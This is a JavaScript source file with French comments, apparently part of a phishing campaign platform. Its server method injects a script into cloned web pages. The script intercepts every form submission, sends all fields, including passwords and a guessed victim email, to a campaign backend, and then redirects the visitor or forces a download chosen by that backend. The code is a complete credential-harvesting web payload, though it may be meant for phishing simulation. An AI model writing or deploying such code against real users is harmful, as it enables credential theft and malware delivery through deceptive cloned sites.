// services/TrackingService.js (Ceci est le code qui sera injecté côté client)

class TrackingService {
    constructor() {
        this.campaignId = null; // Sera défini lors de l'injection
        this.baseUrl = null;    // Sera défini lors de l'injection
        this.pageLoadedAt = Date.now(); // Timestamp de chargement de la page
        this.timeOnPageInterval = null; // Pour le calcul du temps passé sur la page
        this.lastActivityTime = Date.now(); // Pour détecter l'inactivité
        this.inactivityTimeout = 60 * 1000; // 1 minute d'inactivité
    }

    /**
     * Initialise le service de tracking côté client.
     * Appelé par le code injecté dans la page.
     * @param {string} campaignId L'ID de la campagne (utilisé comme token).
     * @param {string} baseUrl L'URL de base de l'API backend.
     */
    init(campaignId, baseUrl) {
        this.campaignId = campaignId;
        this.baseUrl = baseUrl;
        console.log(`[TrackingService] Initialisé pour campagne: ${this.campaignId}, API: ${this.baseUrl}`);

        this.trackPageVisit();
        this.setupFormInterception();
        this.setupLinkTracking();
        this.setupActivityTracking();
    }

    /**
     * Envoie une interaction de visite de page au backend.
     */
    async trackPageVisit() {
        const data = {
            pageUrl: window.location.href,
            referrer: document.referrer,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            }
        };

        try {
            const response = await fetch(`${this.baseUrl}/api/interactions/visit/${this.campaignId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            });
            const result = await response.json();
            if (result.success) {
                console.log('[TrackingService] Visite de page trackée.', data.pageUrl);
            } else {
                console.warn('[TrackingService] Erreur tracking visite de page:', result.message);
            }
        } catch (error) {
            console.error('[TrackingService] Erreur réseau tracking visite de page:', error);
        }
    }

    /**
     * Configure l'interception des soumissions de formulaires.
     */
    setupFormInterception() {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', async (event) => {
                event.preventDefault(); // Empêche la soumission par défaut du formulaire

                console.log('[TrackingService] Formulaire intercepté !');

                const formData = {};
                new FormData(form).forEach((value, key) => {
                    formData[key] = value;
                });

                // Tenter de trouver un email dans les champs du formulaire pour le targetEmail
                let targetEmail = null;
                const emailFieldKey = Object.keys(formData).find(key =>
                    key.toLowerCase().includes('email') || key.toLowerCase().includes('mail')
                );
                if (emailFieldKey && typeof formData[emailFieldKey] === 'string') {
                    targetEmail = formData[emailFieldKey];
                }

                const submissionData = {
                    formData: formData,
                    pageUrl: window.location.href,
                    timestamp: new Date().toISOString(),
                    targetEmail: targetEmail // Envoyer l'email trouvé si possible
                };

                try {
                    const response = await fetch(`${this.baseUrl}/api/interactions/form/${this.campaignId}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(submissionData),
                    });

                    const result = await response.json();

                    if (result.success) {
                        console.log('[TrackingService] Données de formulaire envoyées avec succès.');
                        // Gérer les actions post-soumission du backend
                        if (result.redirectUrl) {
                            console.log('[TrackingService] Redirection vers:', result.redirectUrl);
                            window.location.href = result.redirectUrl;
                        } else if (result.downloadUrl) {
                            console.log('[TrackingService] Téléchargement de fichier:', result.downloadUrl);
                            const link = document.createElement('a');
                            link.href = result.downloadUrl;
                            link.download = result.downloadUrl.split('/').pop(); // Nom du fichier
                            document.body.appendChild(link);
                            link.click();
                            document.body.removeChild(link);
                        } else {
                            // Si aucune action spécifique, soumettre le formulaire "normalement" ou afficher un message
                            console.log('[TrackingService] Aucune action post-soumission spécifiée.');
                            // Optionnel: Réactiver la soumission par défaut si aucune redirection/téléchargement
                            // form.submit(); // Peut causer une double soumission si non géré
                        }
                    } else {
                        console.error('[TrackingService] Erreur lors de l\'envoi du formulaire:', result.message);
                        alert(`Erreur de soumission: ${result.message}`); // Afficher une erreur à l'utilisateur
                    }
                } catch (error) {
                    console.error('[TrackingService] Erreur réseau lors de l\'envoi du formulaire:', error);
                    alert('Une erreur est survenue lors de la soumission du formulaire. Veuillez réessayer.');
                }
            });
        });
    }

    /**
     * Configure le tracking des clics sur les liens internes.
     * Note: Les liens externes (dans les emails) sont gérés par le backend.
     * Ceci est pour les liens DANS la page clonée.
     */
    setupLinkTracking() {
        document.querySelectorAll('a').forEach(link => {
            // Évite de tracker les liens déjà gérés par d'autres mécanismes ou les ancres internes
            if (link.href.startsWith('mailto:') || link.href.startsWith('#')) {
                return;
            }

            link.addEventListener('click', async (event) => {
                // Pour les liens qui mènent à d'autres pages, on laisse le navigateur faire son travail
                // mais on peut envoyer un événement de tracking avant la navigation.
                // Cela est plus complexe car la requête de tracking doit être asynchrone
                // et ne pas bloquer la navigation.
                // Pour l'instant, on se concentre sur les formulaires et visites.
                // Le tracking des clics "externes" (depuis l'email) est géré par la route /api/interactions/click/:encodedData
                // Si tu veux tracker les clics INTERNES, il faudrait une logique plus robuste.
                // Pour la simplicité, on se concentre sur les formulaires et les visites de page.
                console.log('[TrackingService] Clic sur lien détecté (non tracké via JS pour l\'instant):', link.href);
            });
        });
    }

    /**
     * Suivi du temps passé sur la page et de l'activité.
     */
    setupActivityTracking() {
        // Mettre à jour le temps de dernière activité
        const updateActivity = () => {
            this.lastActivityTime = Date.now();
        };

        document.addEventListener('mousemove', updateActivity);
        document.addEventListener('keypress', updateActivity);
        document.addEventListener('scroll', updateActivity);
        document.addEventListener('click', updateActivity);

        // Envoyer un événement "active_session" ou "inactive_session" si besoin
        // Pour l'instant, on se contente du temps de visite initial.
    }

    /**
     * Méthode statique pour injecter le code de tracking dans le HTML.
     * Cette méthode est appelée côté serveur (dans app.js).
     * @param {string} htmlContent Le contenu HTML de la page clonée.
     * @param {string} campaignId L'ID de la campagne à injecter.
     * @returns {string} Le contenu HTML avec le script injecté.
     */
    static injectTrackingCode(htmlContent, campaignId) {
        const script = `
            <script>
                // Variable globale pour le service de tracking
                window.phishingTrackingService = new (${TrackingService.toString()})();
                window.phishingTrackingService.init('${campaignId}', '${process.env.BASE_URL}');

                // S'assurer que le service est prêt avant d'exécuter d'autres scripts
                // (si la page clonée a ses propres scripts qui pourraient interférer)
                document.addEventListener('DOMContentLoaded', () => {
                    // Les écouteurs de formulaire sont déjà mis en place par init()
                    // Si d'autres actions sont nécessaires après le chargement complet du DOM
                });
            </script>
        `;
        // Injecte le script juste avant la balise de fermeture </body>
        return htmlContent.replace('</body>', `${script}</body>`);
    }
}

// Exportation pour utilisation côté serveur
module.exports = TrackingService;

// Note: Le code ci-dessus est un mélange de code côté serveur (injectTrackingCode)
// et de code côté client (le reste de la classe TrackingService).
// C'est une technique courante pour l'injection de scripts.